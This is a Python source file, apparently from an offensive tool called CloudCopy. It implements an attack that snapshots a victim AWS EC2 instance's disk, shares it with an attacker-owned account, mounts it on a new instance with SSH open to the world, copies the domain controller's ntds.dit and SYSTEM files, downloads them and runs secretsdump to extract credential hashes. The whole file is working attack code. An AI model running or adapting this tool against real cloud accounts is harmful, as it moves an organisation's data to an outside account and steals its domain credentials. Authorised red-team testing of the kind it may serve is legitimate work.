import io
import os
import time
import uuid

import boto3
import paramiko
from botocore.exceptions import ClientError

'''
Util methods for actually CloudCopying
'''
class CloudCopyUtils:
    def __init__(self, loginContext):
        self.keyName = str(uuid.uuid4())
        self.loginContext = loginContext  # contains context for the CloudCopy attack
        self.victimInstance = None  # boto3.Instance object that is the victim instance we are CloudCopying
        self.victimSnapshot = None  # boto3.Snapshot that is the snapshot made from victim instance
        self.attackingInstance = None  # boto3.Instance object that is the attacking instance holding the snapshot
        self.securityGroup = None  # boto3.SecurityGroup that is the security group for accessing the attacker instance
        self.instanceKey = None  # boto3.KeyPair that is the PEM key used for accessing the instance
        self.botoClient = None  # boto3 client for accessing AWS programmatically
        self.attackMode = 'victim'  # attack mode currently in use, 'victim' for running in victim AWS 'attacker' for ours

    def printGap(self):
        print('---------------------------------------------------------')

    def cleanup(self):
        self.printGap()
        print("cleaning up any mess we made")
        if self.instanceKey:
            self.instanceKey.delete()
            print("Deleted key " + self.keyName)
            os.remove("./" + self.keyName + ".pem")
            self.instanceKey = None
        if self.attackingInstance:
            print("Waiting for CloudCopy instance to terminate...")
            try:
                self.attackingInstance.terminate()
                self.attackingInstance.wait_until_terminated()
            except ClientError:
                self.attackingInstance.wait_until_terminated()
            self.attackingInstance = None
        if self.securityGroup:
            try:
                self.securityGroup.delete()
                print("Deleted security group " + self.securityGroup.group_name)
            except ClientError as e:
                if e.response['Error']['Code'] != 'InvalidGroup.NotFound':
                    print(
                        "Error deleting Security Group. May still be tied to instance. Waiting 30 secs and trying again.")
                    time.sleep(30)
                    try:
                        self.securityGroup.delete()
                        print("Deleted security group")
                    except ClientError:
                        print("Couldn't delete security group, may have to remove manually.")
            self.securityGroup = None
        if self.victimSnapshot:
            self.attackMode = 'victim'
            try:
                self.createEc2Resource()
                snapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
                snapshot.delete()
                print("Deleted snapshot " + self.victimSnapshot.snapshot_id)
                self.victimSnapshot = None
            except ClientError:
                print("Switching client context back to victim failed. Could not delete initial Snapshot")
        self.printGap()

    def setAttackContext(self, attackContext):
        self.attackMode = attackContext

    # creates the boto3.Resource for accessing AWS
    def createEc2Resource(self):
        try:
            if self.loginContext['type'] == 'profile':
                self.botoClient = boto3.Session(profile_name=self.loginContext['options'][self.attackMode + 'Profile'],
                                                region_name=self.loginContext['options']['region']).resource('ec2')
            else:
                self.botoClient = boto3.Session(
                    aws_access_key_id=self.loginContext['options'][self.attackMode + 'AccessKey'],
                    aws_secret_access_key=self.loginContext['options'][self.attackMode + 'SecretKey'],
                ).resource('ec2')
        except ClientError:
            return False

    # lists available instances within the victim AWS account in the specified region
    def listInstances(self):
        instances = list(self.botoClient.instances.all())
        for index, instance in enumerate(instances):
            if instance.tags is not None:
                print(str(index) + ' - ' + instance.instance_id + ":" + instance.tags[0]['Value'])
            else:
                print(
                    str(index) + ' - ' + instance.instance_id + ": No name. Can CloudCopy but DC Hashes may not exist.")

        inp = input("which instance are we CloudCopying today? (# or exit to go back) ")
        if inp != 'exit':
            self.victimInstance = instances[int(inp)]
            return True
        else:
            return False

    # creates a snapshot of a specified victim instance
    def createSnapshot(self):
        victimVolumeId = self.victimInstance.block_device_mappings[0]['Ebs']['VolumeId']
        try:
            self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                try:
                    self.victimSnapshot = self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=False)
                    self.victimSnapshot.load()
                    while self.victimSnapshot.state != 'completed':
                        print("Snapshot hasn't been created yet, waiting...")
                        self.victimSnapshot.load()
                        time.sleep(10)
                    print("Snapshot created, sharing it with attacker account")
                    return True
                except ClientError:
                    print("Snapshot could not be created, sorry")
                    return False
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
                return False

    # modifies the created snapshot to share it with the attacker owned account
    def modifySnapshot(self):
        if not self.victimSnapshot.encrypted:
            self.victimSnapshot.modify_attribute(Attribute='createVolumePermission', CreateVolumePermission={
                'Add': [{'UserId': self.loginContext['options']['attackeraccountid']}]
            })
            print("Snapshot should have been shared. Switching to attacker account.")
            self.setAttackContext('attacker')
            try:
                self.createEc2Resource()
            except ClientError:
                return False
            self.victimSnapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
            while True:
                try:
                    # just checking if this fails to determine if it's in attacker control
                    self.victimSnapshot.description
                    break
                except ClientError:
                    print("Snapshot hasn't arrived, waiting...")
                    time.sleep(10)
            print("We have the snapshot in our control time to mount it to an instance!")
            return True
        else:
            print("No point sharing the snapshot, it is encrypted")
            return False

    # creates a security group for the attacker controlled instance so that we can SSH to it. It's open to the world FYI
    def createSecurityGroup(self):
        security_group_name = str(uuid.uuid4())
        try:
            self.botoClient.create_security_group(
                Description='For connecting to cred stealing instance.',
                GroupName=security_group_name,
                DryRun=True
            )
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                self.securityGroup = self.botoClient.create_security_group(
                    Description='For connecting to cred stealing instance.',
                    GroupName=security_group_name,
                    DryRun=False
                )
                self.securityGroup.load()
                self.securityGroup.authorize_ingress(GroupId=self.securityGroup.group_id, IpProtocol="tcp",
                                                     CidrIp="0.0.0.0/0", FromPort=22, ToPort=22)
                print("Finished creating security group " + security_group_name + " for instance " +
                      self.victimInstance.instance_id)
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSecurityGroup permission. This attack will not succeed. K-Bye.")
                return False

    # create a key pair for use with the attacking instance if one is not set
    def createKeyPair(self):
        try:
            self.botoClient.create_key_pair(KeyName=self.keyName, DryRun=True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                self.instanceKey = self.botoClient.create_key_pair(KeyName=self.keyName, DryRun=False)
                print("Created new key " + self.keyName + " for instance " + self.victimInstance.instance_id +
                      ". Wrote the PEM file to disc for use later.")
                private_key_string = io.StringIO()
                private_key_string.write(self.instanceKey.key_material)
                private_key_string.seek(0)
                paramiko.RSAKey.from_private_key(private_key_string).write_private_key_file(
                    './' + self.keyName + '.pem')
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateKeyPair permission. This attack will not succeed. K-Bye.")
                return False

    # creates a new attacker owned EC2 instance that uses the snapshot as an attached disk containing the DC hashes
    def createInstance(self):
        try:
            self._createInstance(True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                print("Dry run succeeded! Creating instance for real.")
                self._createInstance(False)
                self.attackingInstance.load()
                while self.attackingInstance.state['Name'].strip() != "running":
                    print("Your instance will be arriving shortly...")
                    time.sleep(10)
                    self.attackingInstance.load()
                print("Your instance has arrived. Time to get some sweet sweet creds!")
                return True
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSecurityGroup permission. This attack will not succeed. K-Bye.")
                return False
            else:
                print(e)
                return False

    # helper to create the instance given a specific key
    def _createInstance(self, isDryRun):
        self.attackingInstance = self.botoClient.create_instances(
            DryRun=isDryRun,
            BlockDeviceMappings=[{
                "DeviceName": '/dev/sdf',
                "Ebs": {
                    "SnapshotId": self.victimSnapshot.snapshot_id
                }
            }],
            SecurityGroupIds=[
                self.securityGroup.group_id,
            ],
            SecurityGroups=[
                self.securityGroup.group_name,
            ],
            ImageId='ami-0c6b1d09930fac512',
            MaxCount=1,
            MinCount=1,
            InstanceType='t2.micro',
            KeyName=self.keyName)[0]

    # helper to create the connection to the attacker instance
    def connectToInstance(self):
        private_key_string = io.StringIO()
        private_key_string.write(self.instanceKey.key_material)
        private_key_string.seek(0)
        key = paramiko.RSAKey.from_private_key(private_key_string)
        connection = paramiko.SSHClient()
        connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to instance")
        connected = False
        while not connected:
            try:
                connection.connect(hostname=self.attackingInstance.public_dns_name, username='ec2-user', pkey=key)
                connected = True
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("Can't connect yet, instance may still be warming up. Trying again in 10s")
                time.sleep(10)
        sftp = connection.open_sftp()
        return connection, sftp


    # SSH's into the instance mounts the DC snapshot copies the ntds.dit and SYSTEM file gives ownership to ec2-user
    # SFTP's into the instance and downloads the ntds.dit and SYSTEM file locally
    # runs impacket's secretsdump tool to recreate the hashes. Expects secretsdump to be on your path.
    def grabDCHashFiles(self):
        outfileUid = str(uuid.uuid4())
        connection, sftp = self.connectToInstance()
        self.printGap()
        #   have to block on these calls to ensure they happen in order
        _, stdout, _ = connection.exec_command("sudo mkdir /windows")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
        stdout.channel.recv_exit_status()
        print("finished configuring instance to grab Hash Files")
        self.printGap()
        print("Pulling the files...")
        try:
            sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM-" + outfileUid)
            print("SYSTEM registry hive file retrieval complete")
            sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit-" + outfileUid)
            print("ntds.dit registry hive file retrieval complete")
            sftp.close()
            connection.close()
            self.printGap()
            print("finally gonna run secretsdump!")
            import subprocess
            subprocess.run(
                ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid, "local",
                 "-outputfile", "secrets-" + outfileUid])
        except Exception as e:
            print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
